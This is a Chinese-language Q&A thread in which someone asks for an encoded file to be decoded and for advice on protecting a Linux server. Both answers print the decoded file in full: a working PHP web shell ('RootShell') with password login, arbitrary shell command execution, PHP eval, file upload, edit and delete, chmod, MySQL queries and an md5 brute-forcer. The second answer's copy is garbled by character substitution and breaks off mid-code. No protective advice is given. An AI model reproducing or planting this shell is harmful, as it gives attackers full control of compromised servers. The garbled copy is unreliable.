可以帮助我解码文件
并告诉我如何保护服务器 linux 免受编码外壳的影响

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-31T08:24:55.743

这是解码后的脚本

```
?><?php
error_reporting(0); //If there is an error, we'll show it, k?
$password = ""; // You can put a md5 string here too, for plaintext passwords: max 31 chars.
$me = basename('the actual path of this script');
$cookiename = "wieeeee";

if(isset($_POST['pass'])) //If the user made a login attempt, "pass" will be set eh?
{
 if(strlen($password) == 32) //If the length of the password is 32 characters, threat it as an md5.
 {
  $_POST['pass'] = md5($_POST['pass']);
 }
 if($_POST['pass'] == $password)
 {
   setcookie($cookiename, $_POST['pass'], time()+3600); //It's alright, let hem in
 }
 reload();
}

if(!empty($password) && !isset($_COOKIE[$cookiename]) or ($_COOKIE[$cookiename] != $password))
{
 login();
 die();
}
//
//Do not cross this line! All code placed after this block can't be executed without being logged in!
//
if(isset($_GET['p']) && $_GET['p'] == "logout")
{
setcookie ($cookiename, "", time() - 3600);
reload();
}
if(isset($_GET['dir']))
{
 chdir($_GET['dir']);
}

$pages = array(
 'cmd' => 'Execute Command',
 'eval' => 'Evaluate PHP',
 'mysql' => 'MySQL Query',
 'chmod' => 'Chmod File',
 'phpinfo' => 'PHPinfo',
 'md5' => 'md5 cracker',
 'headers' => 'Show headers',
 'logout' => 'Log out'
);
//The header, like it?
$header = '<html>
<title>'.getenv("HTTP_HOST").' ~ Shell I</title>
<head>
<style>
td {
 font-size: 12px; 
 font-family: verdana;
 color: #33FF00;
 background: #000000;
}
#d {
 background: #003000;
}
#f {
 background: #003300;
}
#s {
 background: #006300;
}
#d:hover
{
 background: #003300;
}
#f:hover
{
 background: #003000;
}
pre {
 font-size: 10px; 
 font-family: verdana;
 color: #33FF00;
}
a:hover {
text-decoration: none;
}

input,textarea,select {
 border-top-width: 1px; 
 font-weight: bold; 
 border-left-width: 1px; 
 font-size: 10px; 
 border-left-color: #33FF00; 
 background: #000000; 
 border-bottom-width: 1px; 
 border-bottom-color: #33FF00; 
 color: #33FF00; 
 border-top-color: #33FF00; 
 font-family: verdana; 
 border-right-width: 1px; 
 border-right-color: #33FF00;
}
hr {
color: #33FF00;
background-color: #33FF00;
height: 5px;
}
</style>
</head>
<body bgcolor=black alink="#33CC00" vlink="#339900" link="#339900">
<table width=100%><td id="header" width=100%>
<p align=right><b>[<a href="http://www.rootshell-team.info">RootShell</a>]  [<a href="'.$me.'">Home</a>] ';
foreach($pages as $page => $page_name)
{
 $header .= ' [<a href="?p='.$page.'&dir='.realpath('.').'">'.$page_name.'</a>] ';
}
$header .= '<br><hr>'.show_dirs('.').'</td><tr><td>';
print $header;
$footer = '<tr><td><hr><center>&copy; <a href="http://www.ironwarez.info">Iron</a> & <a href="http://www.rootshell-team.info">RootShell Security Group</a></center></td></table></body></head></html>';

//
//Page handling
//
if(isset($_REQUEST['p']))
{
  switch ($_REQUEST['p']) {

   case 'cmd': //Run command

    print "<form action=\"".$me."?p=cmd&dir=".realpath('.')."\" method=POST><b>Command:</b><input type=text name=command><input type=submit value=\"Execute\"></form>";
     if(isset($_REQUEST['command']))
     {
      print "<pre>";
      execute_command(get_execution_method(),$_REQUEST['command']); //You want fries with that?
     }
   break;

   case 'edit': //Edit a fie
    if(isset($_POST['editform']))
    {
     $f = $_GET['file'];
     $fh = fopen($f, 'w') or print "Error while opening file!";
     fwrite($fh, $_POST['editform']) or print "Couldn't save file!";
     fclose($fh);
    }
    print "Editing file <b>".$_GET['file']."</b> (".perm($_GET['file']).")<br><br><form action=\"".$me."?p=edit&file=".$_GET['file']."&dir=".realpath('.')."\" method=POST><textarea cols=90 rows=15 name=\"editform\">";

    if(file_exists($_GET['file']))
    {
     $rd = file($_GET['file']);
     foreach($rd as $l)
     {
      print htmlspecialchars($l);
     }
    }

    print "</textarea><input type=submit value=\"Save\"></form>";

   break;

   case 'delete': //Delete a file

    if(isset($_POST['yes']))
    {
     if(unlink($_GET['file']))
     {
      print "File deleted successfully.";
     }
     else
     {
      print "Couldn't delete file.";
     }
    }

    if(isset($_GET['file']) && file_exists($_GET['file']) && !isset($_POST['yes']))
    {
     print "Are you sure you want to delete ".$_GET['file']."?<br>
     <form action=\"".$me."?p=delete&file=".$_GET['file']."\" method=POST>
     <input type=hidden name=yes value=yes>
     <input type=submit value=\"Delete\">
     ";
    }

   break;

   case 'eval': //Evaluate PHP code

    print "<form action=\"".$me."?p=eval\" method=POST>
    <textarea cols=60 rows=10 name=\"eval\">";
    if(isset($_POST['eval']))
    {
     print htmlspecialchars($_POST['eval']);
    }
    else
    {
     print "print \"Yo Momma\";";
    }
    print "</textarea><br>
    <input type=submit value=\"Eval\">
    </form>";

    if(isset($_POST['eval']))
    {
     print "<h1>Output:</h1>";
     print "<br>";
     eval($_POST['eval']);
    }

   break;

   case 'chmod': //Chmod file

    print "<h1>Under construction!</h1>";
    if(isset($_POST['chmod']))
    {
    switch ($_POST['chvalue']){
     case 777:
     chmod($_POST['chmod'],0777);
     break;
     case 644:
     chmod($_POST['chmod'],0644);
     break;
     case 755:
     chmod($_POST['chmod'],0755);
     break;
    }
    print "Changed permissions on ".$_POST['chmod']." to ".$_POST['chvalue'].".";
    }
    if(isset($_GET['file']))
    {
     $content = urldecode($_GET['file']);
    }
    else
    {
     $content = "file/path/please";
    }

    print "<form action=\"".$me."?p=chmod&file=".$content."&dir=".realpath('.')."\" method=POST><b>File to chmod:
    <input type=text name=chmod value=\"".$content."\" size=70><br><b>New permission:</b>
    <select name=\"chvalue\">
<option value=\"777\">777</option>
<option value=\"644\">644</option>
<option value=\"755\">755</option>
</select><input type=submit value=\"Change\">";

   break;

   case 'mysql': //MySQL Query

   if(isset($_POST['host']))
   {
    $link = mysql_connect($_POST['host'], $_POST['username'], $_POST['mysqlpass']) or die('Could not connect: ' . mysql_error());
    mysql_select_db($_POST['dbase']);
    $sql = $_POST['query'];

    $result = mysql_query($sql);

   }
   else
   {
    print "
    This only queries the database, doesn't return data!<br>
    <form action=\"".$me."?p=mysql\" method=POST>
    <b>Host:<br></b><input type=text name=host value=\"localhost\" size=10><br>
    <b>Username:<br><input type=text name=username value=\"root\" size=10><br>
    <b>Password:<br></b><input type=password name=mysqlpass value=\"\" size=10><br>
    <b>Database:<br><input type=text name=dbase value=\"test\" size=10><br>

    <b>Query:<br></b<textarea name=query></textarea>
    <input type=submit value=\"Query database\">
    </form>
    ";

   }

   break;

   case 'createdir':
   if(mkdir($_GET['crdir']))
   {
   print 'Directory created successfully.';
   }
   else
   {
   print 'Couldn\'t create directory';
   }
   break;

   case 'phpinfo': //PHP Info
    phpinfo();
   break;

   case 'rename':

    if(isset($_POST['fileold']))
    {
     if(rename($_POST['fileold'],$_POST['filenew']))
     {
      print "File renamed.";
     }
     else
     {
      print "Couldn't rename file.";
     }

    }
    if(isset($_GET['file']))
    {
     $file = basename(htmlspecialchars($_GET['file']));
    }
    else
    {
     $file = "";
    }

    print "Renaming ".$file." in folder ".realpath('.').".<br>
        <form action=\"".$me."?p=rename&dir=".realpath('.')."\" method=POST>
     <b>Rename:<br></b><input type=text name=fileold value=\"".$file."\" size=70><br>
     <b>To:<br><input type=text name=filenew value=\"\" size=10><br>
     <input type=submit value=\"Rename file\">
     </form>";
   break;

   case 'md5':
   if(isset($_POST['md5']))
   {
   if(!is_numeric($_POST['timelimit']))
   {
   $_POST['timelimit'] = 30;
   }
   set_time_limit($_POST['timelimit']);
    if(strlen($_POST['md5']) == 32)
    {

      if($_POST['chars'] == "9999")
      {
      $i = 0;
      while($_POST['md5'] != md5($i) && $i != 100000)
       {
        $i++;
       }
      }
      else
      {
       for($i = "a"; $i != "zzzzz"; $i++)
       {
        if(md5($i == $_POST['md5']))
        {
         break;
        }
       }
      }

     if(md5($i) == $_POST['md5'])
     {
       print "<h1>Plaintext of ". $_POST['md5']. " is <i>".$i."</i></h1><br><br>";
     }

    }

   }

   print "Will bruteforce the md5
    <form action=\"".$me."?p=md5\" method=POST>
    <b>md5 to crack:<br></b><input type=text name=md5 value=\"\" size=40><br>
    <b>Characters:</b><br><select name=\"chars\">
    <option value=\"az\">a - zzzzz</option>
    <option value=\"9999\">1 - 9999999</option>
    </select>
    <b>Max. cracking time*:<br></b><input type=text name=timelimit value=\"30\" size=2><br>
    <input type=submit value=\"Bruteforce md5\">
    </form><br>*: if set_time_limit is allowed by php.ini";
   break;

   case 'headers':
   foreach(getallheaders() as $header => $value)
   {
   print htmlspecialchars($header . ":" . $value)."<br>";

   }
   break;
  }
}
else //Default page that will be shown when the page isn't found or no page is selected.
{

 $files = array();
 $directories = array();

 if(isset($_FILES['uploadedfile']['name']))
{
 $target_path = realpath('.').'/';
 $target_path = $target_path . basename( $_FILES['uploadedfile']['name']); 
 if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
     print "File:".  basename( $_FILES['uploadedfile']['name']). 
     " has been uploaded";
 } else{
     echo "File upload failed!";
 }
}

 print "<table border=0 width=100%><td width=5% id=s><b>Options</b></td><td id=s><b>Filename</b></td><td id=s><b>Size</b></td><td id=s><b>Permissions</b></td><td id=s>Last modified</td><tr>";
 if ($handle = opendir('.'))
 {
  while (false !== ($file = readdir($handle))) 
  {
        if(is_dir($file))
     {
    $directories[] = $file;
     }
     else
     {
    $files[] = $file;
     }
  }
 asort($directories);
 asort($files);
  foreach($directories as $file)
  {
   print "<td id=d><a href=\"?p=rename&file=".realpath($file)."&dir=".realpath('.')."\">[R]</a><a href=\"?p=delete&file=".realpath($file)."\">[D]</a></td><td id=d><a href=\"".$me."?dir=".realpath($file)."\">".$file."</a></td><td id=d></td><td id=d><a href=\"?p=chmod&dir=".realpath('.')."&file=".realpath($file)."\"><font color=".get_color($file).">".perm($file)."</font></a></td><td id=d>".date ("Y/m/d, H:i:s", filemtime($file))."</td><tr>";
  }

  foreach($files as $file)
  {
   print "<td id=f><a href=\"?p=rename&file=".realpath($file)."&dir=".realpath('.')."\">[R]</a><a href=\"?p=delete&file=".realpath($file)."\">[D]</a></td><td id=f><a href=\"".$me."?p=edit&dir=".realpath('.')."&file=".realpath($file)."\">".$file."</a></td><td id=f>".filesize($file)."</td><td id=f><a href=\"?p=chmod&dir=".realpath('.')."&file=".realpath($file)."\"><font color=".get_color($file).">".perm($file)."</font></a></td><td id=f>".date ("Y/m/d, H:i:s", filemtime($file))."</td><tr>";
  }
 }
 else
 {
  print "<u>Error!</u> Can't open <b>".realpath('.')."</b>!<br>";
 }

 print "</table><hr><table border=0 width=100%><td><b>Upload file</b><br><form enctype=\"multipart/form-data\" action=\"".$me."?dir=".realpath('.')."\" method=\"POST\">
<input type=\"hidden\" name=\"MAX_FILE_SIZE\" value=\"100000000\" /><input size=30 name=\"uploadedfile\" type=\"file\" />
<input type=\"submit\" value=\"Upload File\" />
</form></td><td><form action=\"".$me."\" method=GET><b>Change Directory<br></b><input type=text size=40 name=dir value=\"".realpath('.')."\"><input type=submit value=\"Change Directory\"></form></td>
<tr><td><form action=\"".$me."\" method=GET><b>Create file<br></b><input type=hidden name=dir value=\"".realpath('.')."\"><input type=text size=40 name=file value=\"".realpath('.')."\"><input type=hidden name=p value=edit><input type=submit value=\"Create file\"></form>
</td><td><form action=\"".$me."\" method=GET><b>Create directory<br></b><input type=text size=40 name=crdir value=\"".realpath('.')."\"><input type=hidden name=dir value=\"".realpath('.')."\"><input type=hidden name=p value=createdir><input type=submit value=\"Create directory\"></form></td>
</table>";

}

function login()
{
 print "<table border=0 width=100% height=100%><td valign=\"middle\"><center>
 <form action=".basename('the actual path of this script')." method=\"POST\"><b>Password?</b>
 <input type=\"password\" maxlength=\"32\" name=\"pass\"><input type=\"submit\" value=\"Login\">
 </form>";
}
function reload()
{
 header("Location: ".basename('the actual path of this script'));
}
function get_execution_method()
{
 if(function_exists('passthru')){ $m = "passthru"; }
 if(function_exists('exec')){ $m = "exec"; }
 if(function_exists('shell_exec')){ $m = "shell_ exec"; }
 if(function_exists('system')){ $m = "system"; }
 if(!isset($m)) //No method found :-|
 {
  $m = "Disabled";
 }
 return($m);
}
function execute_command($method,$command)
{
 if($method == "passthru")
 {
  passthru($command);
 }

 elseif($method == "exec")
 {
  exec($command,$result);
  foreach($result as $output)
  {
   print $output."<br>";
  }
 }

 elseif($method == "shell_exec")
 {
  print shell_exec($command);
 }

 elseif($method == "system")
 {
  system($command);
 }
}
function perm($file)
{
 if(file_exists($file))
 {
  return substr(sprintf('%o', fileperms($file)), -4);
 }
 else
 {
  return "????";
 }
}
function get_color($file)
{
if(is_writable($file)) { return "green";}
if(!is_writable($file) && is_readable($file)) { return "white";}
if(!is_writable($file) && !is_readable($file)) { return "red";}

}
function show_dirs($where)
{
 if(ereg("^c:",realpath($where)))
 {
 $dirparts = explode('\\',realpath($where));
 }
 else
 {
 $dirparts = explode('/',realpath($where));
 }

 $i = 0;
 $total = "";

 foreach($dirparts as $part)
 {
  $p = 0;
  $pre = "";
  while($p != $i)
  {
   $pre .= $dirparts[$p]."/";
   $p++;

  }
  $total .= "<a href=\"".basename('the actual path of this script')."?dir=".$pre.$part."\">".$part."</a>/";
  $i++;
 }

 return "<h2>".$total."</h2><br>";
}
print $footer;
// Exit: maybe we're included somewhere and we don't want the other code to mess with ours :-)
exit();
?> 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-07-31T08:07:31.460

这是一个base64字符串（末尾的“==”是知道它是base64的线索；））

这是解码的字符串：

```
?><?php
5rr2r_r5p2rt4ng(0); //If th5r5 4s 1n 5rr2r, w5'll sh2w 4t, k?
$p1ssw2rd = ""; // Y23 c1n p3t 1 mdi str4ng h5r5 t22, f2r pl14nt5xt p1ssw2rds: m1x o6 ch1rs.
$m5 = b1s5n1m5(__FILE__);
$c22k45n1m5 = "w455555";

4f(4ss5t($_POST['p1ss'])) //If th5 3s5r m1d5 1 l2g4n 1tt5mpt, "p1ss" w4ll b5 s5t 5h?
{
 4f(strl5n($p1ssw2rd) == oa) //If th5 l5ngth 2f th5 p1ssw2rd 4s oa ch1r1ct5rs, thr51t 4t 1s 1n mdi.
 {
  $_POST['p1ss'] = mdi($_POST['p1ss']);
 }
 4f($_POST['p1ss'] == $p1ssw2rd)
 {
   s5tc22k45($c22k45n1m5, $_POST['p1ss'], t4m5()+oe00); //It's 1lr4ght, l5t h5m 4n
 }
 r5l21d();
}

4f(!5mpty($p1ssw2rd) && !4ss5t($_COOKIE[$c22k45n1m5]) 2r ($_COOKIE[$c22k45n1m5] != $p1ssw2rd))
{
 l2g4n();
 d45();
}
//
//D2 n2t cr2ss th4s l4n5! All c2d5 pl1c5d 1ft5r th4s bl2ck c1n't b5 5x5c3t5d w4th23t b54ng l2gg5d 4n!
//
4f(4ss5t($_GET['p']) && $_GET['p'] == "l2g23t")
{
s5tc22k45 ($c22k45n1m5, "", t4m5() - oe00);
r5l21d();
}
4f(4ss5t($_GET['d4r']))
{
 chd4r($_GET['d4r']);
}

$p1g5s = 1rr1y(
 'cmd' => 'Ex5c3t5 C2mm1nd',
 '5v1l' => 'Ev1l31t5 PHP',
 'mysql' => 'MySQL Q35ry',
 'chm2d' => 'Chm2d F4l5',
 'php4nf2' => 'PHP4nf2',
 'mdi' => 'mdi cr1ck5r',
 'h51d5rs' => 'Sh2w h51d5rs',
 'l2g23t' => 'L2g 23t'
);
//Th5 h51d5r, l4k5 4t?
$h51d5r = '<html>
<t4tl5>'.g5t5nv("HTTP_HOST").' ~ Sh5ll I</t4tl5>
<h51d>
<styl5>
td {
 f2nt-s4z5: 6apx; 
 f2nt-f1m4ly: v5rd1n1;
 c2l2r: #ooFF00;
 b1ckgr23nd: #000000;
}
#d {
 b1ckgr23nd: #00o000;
}
#f {
 b1ckgr23nd: #00oo00;
}
#s {
 b1ckgr23nd: #00eo00;
}
#d:h2v5r
{
 b1ckgr23nd: #00oo00;
}
#f:h2v5r
{
 b1ckgr23nd: #00o000;
}
pr5 {
 f2nt-s4z5: 60px; 
 f2nt-f1m4ly: v5rd1n1;
 c2l2r: #ooFF00;
}
1:h2v5r {
t5xt-d5c2r1t42n: n2n5;
}

4np3t,t5xt1r51,s5l5ct {
 b2rd5r-t2p-w4dth: 6px; 
 f2nt-w54ght: b2ld; 
 b2rd5r-l5ft-w4dth: 6px; 
 f2nt-s4z5: 60px; 
 b2rd5r-l5ft-c2l2r: #ooFF00; 
 b1ckgr23nd: #000000; 
 b2rd5r-b2tt2m-w4dth: 6px; 
 b2rd5r-b2tt2m-c2l2r: #ooFF00; 
 c2l2r: #ooFF00; 
 b2rd5r-t2p-c2l2r: #ooFF00; 
 f2nt-f1m4ly: v5rd1n1; 
 b2rd5r-r4ght-w4dth: 6px; 
 b2rd5r-r4ght-c2l2r: #ooFF00;
}
hr {
c2l2r: #ooFF00;
b1ckgr23nd-c2l2r: #ooFF00;
h54ght: ipx;
}
</styl5>
</h51d>
<b2dy bgc2l2r=bl1ck 1l4nk="#ooCC00" vl4nk="#oo9900" l4nk="#oo9900">
<t1bl5 w4dth=600%><td 4d="h51d5r" w4dth=600%>
<p 1l4gn=r4ght><b>[<1 hr5f="http://www.r22tsh5ll-t51m.4nf2">R22tSh5ll</1>]  [<1 hr5f="'.$m5.'">H2m5</1>] ';
f2r51ch($p1g5s 1s $p1g5 => $p1g5_n1m5)
{
 $h51d5r .= ' [<1 hr5f="?p='.$p1g5.'&d4r='.r51lp1th('.').'">'.$p1g5_n1m5.'</1>] ';
}
$h51d5r .= '<br><hr>'.sh2w_d4rs('.').'</td><tr><td>';
pr4nt $h51d5r;
$f22t5r = '<tr><td><hr><c5nt5r>&c2py; <1 hr5f="http://www.4r2nw1r5z.4nf2">Ir2n</1> & <1 hr5f="http://www.r22tsh5ll-t51m.4nf2">R22tSh5ll S5c3r4ty Gr23p</1></c5nt5r></td></t1bl5></b2dy></h51d></html>';

//
//P1g5 h1ndl4ng
//
4f(4ss5t($_REQUEST['p']))
{
  sw4tch ($_REQUEST['p']) {

   c1s5 'cmd': //R3n c2mm1nd

    pr4nt "<f2rm 1ct42n=\"".$m5."?p=cmd&d4r=".r51lp1th('.')."\" m5th2d=POST><b>C2mm1nd:</b><4np3t typ5=t5xt n1m5=c2mm1nd><4np3t typ5=s3bm4t v1l35=\"Ex5c3t5\"></f2rm>";
     4f(4ss5t($_REQUEST['c2mm1nd']))
     {
      pr4nt "<pr5>";
      5x5c3t5_c2mm1nd(g5t_5x5c3t42n_m5th2d(),$_REQUEST['c2mm1nd']); //Y23 w1nt fr45s w4th th1t?
     }
   br51k;

   c1s5 '5d4t': //Ed4t 1 f45
    4f(4ss5t($_POST['5d4tf2rm']))
    {
     $f = $_GET['f4l5'];
     $fh = f2p5n($f, 'w') 2r pr4nt "Err2r wh4l5 2p5n4ng f4l5!";
     fwr4t5($fh, $_POST['5d4tf2rm']) 2r pr4nt "C23ldn't s1v5 f4l5!";
     fcl2s5($fh);
    }
    pr4nt "Ed4t4ng f4l5 <b>".$_GET['f4l5']."</b> (".p5rm($_GET['f4l5']).")<br><br><f2rm 1ct42n=\"".$m5."?p=5d4t&f4l5=".$_GET['f4l5']."&d4r=".r51lp1th('.')."\" m5th2d=POST><t5xt1r51 c2ls=90 r2ws=6i n1m5=\"5d4tf2rm\">";

    4f(f4l5_5x4sts($_GET['f4l5']))
    {
     $rd = f4l5($_GET['f4l5']);
     f2r51ch($rd 1s $l)
     {
      pr4nt htmlsp5c41lch1rs($l);
     }
    }

    pr4nt "</t5xt1r51><4np3t typ5=s3bm4t v1l35=\"S1v5\"></f2rm>";

   br51k;

   c1s5 'd5l5t5': //D5l5t5 1 f4l5

    4f(4ss5t($_POST['y5s']))
    {
     4f(3nl4nk($_GET['f4l5']))
     {
      pr4nt "F4l5 d5l5t5d s3cc5ssf3lly.";
     }
     5ls5
     {
      pr4nt "C23ldn't d5l5t5 f4l5.";
     }
    }

    4f(4ss5t($_GET['f4l5']) && f4l5_5x4sts($_GET['f4l5']) && !4ss5t($_POST['y5s']))
    {
     pr4nt "Ar5 y23 s3r5 y23 w1nt t2 d5l5t5 ".$_GET['f4l5']."?<br>
     <f2rm 1ct42n=\"".$m5."?p=d5l5t5&f4l5=".$_GET['f4l5']."\" m5th2d=POST>
     <4np3t typ5=h4dd5n n1m5=y5s v1l35=y5s>
     <4np3t typ5=s3bm4t v1l35=\"D5l5t5\">
     ";
    }

   br51k;

   c1s5 '5v1l': //Ev1l31t5 PHP c2d5

    pr4nt "<f2rm 1ct42n=\"".$m5."?p=5v1l\" m5th2d=POST>
    <t5xt1r51 c2ls=e0 r2ws=60 n1m5=\"5v1l\">";
    4f(4ss5t($_POST['5v1l']))
    {
     pr4nt htmlsp5c41lch1rs($_POST['5v1l']);
    }
    5ls5
    {
     pr4nt "pr4nt \"Y2 M2mm1\";";
    }
    pr4nt "</t5xt1r51><br>
    <4np3t typ5=s3bm4t v1l35=\"Ev1l\">
    </f2rm>";

    4f(4ss5t($_POST['5v1l']))
    {
     pr4nt "<h6>O3tp3t:</h6>";
     pr4nt "<br>";
     5v1l($_POST['5v1l']);
    }

   br51k;

   c1s5 'chm2d': //Chm2d f4l5

    pr4nt "<h6>Und5r c2nstr3ct42n!</h6>";
    4f(4ss5t($_POST['chm2d']))
    {
    sw4tch ($_POST['chv1l35']){
     c1s5 777:
     chm2d($_POST['chm2d'],0777);
     br51k;
     c1s5 euu:
     chm2d($_POST['chm2d'],0euu);
     br51k;
     c1s5 7ii:
     chm2d($_POST['chm2d'],07ii);
     br51k;
    }
    pr4nt "Ch1ng5d p5rm4ss42ns 2n ".$_POST['chm2d']." t2 ".$_POST['chv1l35'].".";
    }
    4f(4ss5t($_GET['f4l5']))
    {
     $c2nt5nt = 3rld5c2d5($_GET['f4l5']);
    }
    5ls5
    {
     $c2nt5nt = "f4l5/p1th/pl51s5";
    }

    pr4nt "<f2rm 1ct42n=\"".$m5."?p=chm2d&f4l5=".$c2nt5nt."&d4r=".r51lp1th('.')."\" m5th2d=POST><b>F4l5 t2 chm2d:
    <4np3t typ5=t5xt n1m5=chm2d v1l35=\"".$c2nt5nt."\" s4z5=70><br><b>N5w p5rm4ss42n:</b>
    <s5l5ct n1m5=\"chv1l35\">
<2pt42n v1l35=\"777\">777</2pt42n>
<2pt42n v1l35=\"euu\">euu</2pt42n>
<2pt42n v1l35=\"7ii\">7ii</2pt42n>
</s5l5ct><4np3t typ5=s3bm4t v1l35=\"Ch1ng5\">";

   br51k;

   c1s5 'mysql': //MySQL Q35ry

   4f(4ss5t($_POST['h2st']))
   {
    $l4nk = mysql_c2nn5ct($_POST['h2st'], $_POST['3s5rn1m5'], $_POST['mysqlp1ss']) 2r d45('C23ld n2t c2nn5ct: ' . mysql_5rr2r());
    mysql_s5l5ct_db($_POST['db1s5']);
    $sql = $_POST['q35ry'];

    $r5s3lt = mysql_q35ry($sql);

   }
   5ls5
   {
    pr4nt "
    Th4s 2nly q35r45s th5 d1t1b1s5, d25sn't r5t3rn d1t1!<br>
    <f2rm 1ct42n=\"".$m5."?p=mysql\" m5th2d=POST>
    <b>H2st:<br></b><4np3t typ5=t5xt n1m5=h2st v1l35=\"l2c1lh2st\" s4z5=60><br>
    <b>Us5rn1m5:<br><4np3t typ5=t5xt n1m5=3s5rn1m5 v1l35=\"r22t\" s4z5=60><br>
    <b>P1ssw2rd:<br></b><4np3t typ5=p1ssw2rd n1m5=mysqlp1ss v1l35=\"\" s4z5=60><br>
    <b>D1t1b1s5:<br><4np3t typ5=t5xt n1m5=db1s5 v1l35=\"t5st\" s4z5=60><br>

    <b>Q35ry:<br></b<t5xt1r51 n1m5=q35ry></t5xt1r51>
    <4np3t typ5=s3bm4t v1l35=\"Q35ry d1t1b1s5\">
    </f2rm>
    ";

   }

   br51k;

   c1s5 'cr51t5d4r':
   4f(mkd4r($_GET['crd4r']))
   {
   pr4nt 'D4r5ct2ry cr51t5d s3cc5ssf3lly.';
   }
   5ls5
   {
   pr4nt 'C23ldn\'t cr51t5 d4r5ct2ry';
   }
   br51k;

   c1s5 'php4nf2': //PHP Inf2
    php4nf2();
   br51k;

   c1s5 'r5n1m5':

    4f(4ss5t($_POST['f4l52ld']))
    {
     4f(r5n1m5($_POST['f4l52ld'],$_POST['f4l5n5w']))
     {
      pr4nt "F4l5 r5n1m5d.";
     }
     5ls5
     {
      pr4nt "C23ldn't r5n1m5 f4l5.";
     }

    }
    4f(4ss5t($_GET['f4l5']))
    {
     $f4l5 = b1s5n1m5(htmlsp5c41lch1rs($_GET['f4l5']));
    }
    5ls5
    {
     $f4l5 = "";
    }

    pr4nt "R5n1m4ng ".$f4l5." 4n f2ld5r ".r51lp1th('.').".<br>
        <f2rm 1ct42n=\"".$m5."?p=r5n1m5&d4r=".r51lp1th('.')."\" m5th2d=POST>
     <b>R5n1m5:<br></b><4np3t typ5=t5xt n1m5=f4l52ld v1l35=\"".$f4l5."\" s4z5=70><br>
     <b>T2:<br><4np3t typ5=t5xt n1m5=f4l5n5w v1l35=\"\" s4z5=60><br>
     <4np3t typ5=s3bm4t v1l35=\"R5n1m5 f4l5\">
     </f2rm>";
   br51k;

   c1s5 'mdi':
   4f(4ss5t($_POST['mdi']))
   {
   4f(!4s_n3m5r4c($_POST['t4m5l4m4t']))
   {
   $_POST['t4m5l4m4t'] = o0;
   }
   s5t_t4m5_l4m4t($_POST['t4m5l4m4t']);
    4f(strl5n($_POST['mdi']) == oa)
    {

      4f($_POST['ch1rs'] == "9999")
      {
      $4 = 0;
      wh4l5($_POST['mdi'] != mdi($4) && $4 != 600000)
       {
        $4++;
       }
      }
      5ls5
      {
       f2r($4 = "1"; $4 != "zzzzz"; $4++)
       {
        4f(mdi($4 == $_POST['mdi']))
        {
         br51k;
        }
       }
      }

     4f(mdi($4) == $_POST['mdi'])
     {
       pr4nt "<h6>Pl14nt5xt 2f ". $_POST['mdi']. " 4s <4>".$4."</4></h6><br><br>";
     }

    }

   }

   pr4nt "W4ll br3t5f2rc5 th5 mdi
    <f2rm 1ct42n=\"".$m5."?p=mdi\" m5th2d=POST>
    <b>mdi t2 cr1ck:<br></b><4np3t typ5=t5xt n1m5=mdi v1l35=\"\" s4z5=u0><br>
    <b>Ch1r1ct5rs:</b><br><s5l5ct n1m5=\"ch1rs\">
    <2pt42n v1l35=\"1z\">1 - zzzzz</2pt42n>
    <2pt42n v1l35=\"9999\">6 - 9999999</2pt42n>
    </s5l5ct>
    <b>M1x. cr1ck4ng t4m5*:<br></b><4np3t typ5=t5xt n1m5=t4m5l4m4t v1l35=\"o0\" s4z5=a><br>
    <4np3t typ5=s3bm4t v1l35=\"Br3t5f2rc5 mdi\">
    </f2rm><br>*: 4f s5t_t4m5_l4m4t 4s 1ll2w5d by php.4n4";
   br51k;

   c1s5 'h51d5rs':
   f2r51ch(g5t1llh51d5rs() 1s $h51d5r => $v1l35)
   {
   pr4nt htmlsp5c41lch1rs($h51d5r . ":" . $v1l35)."<br>";

   }
   br51k;
  }
}
5ls5 //D5f13lt p1g5 th1t w4ll b5 sh2wn wh5n th5 p1g5 4sn't f23nd 2r n2 p1g5 4s s5l5ct5d.
{

 $f4l5s = 1rr1y();
 $d4r5ct2r45s = 1rr1y();

 4f(4ss5t($_FILES['3pl21d5df4l5']['n1m5']))
{
 $t1rg5t_p1th = r51lp1th('.').'/';
 $t1rg5t_p1th = $t1rg5t_p1th . b1s5n1m5( $_FILES['3pl21d5df4l5']['n1m5']); 
 4f(m2v5_3pl21d5d_f4l5($_FILES['3pl21d5df4l5']['tmp_n1m5'], $t1rg5t_p1th)) {
     pr4nt "F4l5:".  b1s5n1m5( $_FILES['3pl21d5df4l5']['n1m5']). 
     " h1s b55n 3pl21d5d";
 } 5ls5{
     5ch2 "F4l5 3pl21d f14l5d!";
 }
}

 pr4nt "<t1bl5 b2rd5r=0 w4dth=600%><td w4dth=i% 4d=s><b>Opt42ns</b></td><td 4d=s><b>F4l5n1m5</b></td><td 4d=s><b>S4z5</b></td><td 4d=s><b>P5rm4ss42ns</b></td><td 4d=s>L1st m2d4f45d</td><tr>";
 4f ($h1ndl5 = 2p5nd4r('.'))
 {
  wh4l5 (f1ls5 !== ($f4l5 = r51dd4r($h1ndl5))) 
  {
        4f(4s_d4r($f4l5))
     {
    $d4r5ct2r45s[] = $f4l5;
     }
     5ls5
     {
    $f4l5s[] = $f4l5;
     }
  }
 1s2rt($d4r5ct2r45s);
 1s2rt($f4l5s);
  f2r51ch($d4r5ct2r45s 1s $f4l5)
  {
   pr4nt "<td 4d=d><1 hr5f=\"?p=r5n1m5&f4l5=".r51lp1th($f4l5)."&d4r=".r51lp1th('.')."\">[R]</1><1 hr5f=\"?p=d5l5t5&f4l5=".r51lp1th($f4l5)."\">[D]</1></td><td 4d=d><1 hr5f=\"".$m5."?d4r=".r51lp1th($f4l5)."\">".$f4l5."</1></td><td 4d=d></td><td 4d=d><1 hr5f=\"?p=chm2d&d4r=".r51lp1th('.')."&f4l5=".r51lp1th($f4l5)."\"><f2nt c2l2r=".g5t_c2l2r($f4l5).">".p5rm($f4l5)."</f2nt></1></td><td 4d=d>".d1t5 ("Y/m/d, H:4:s", f4l5mt4m5($f4l5))."</td><tr>";
  }

  f2r51ch($f4l5s 1s $f4l5)
  {
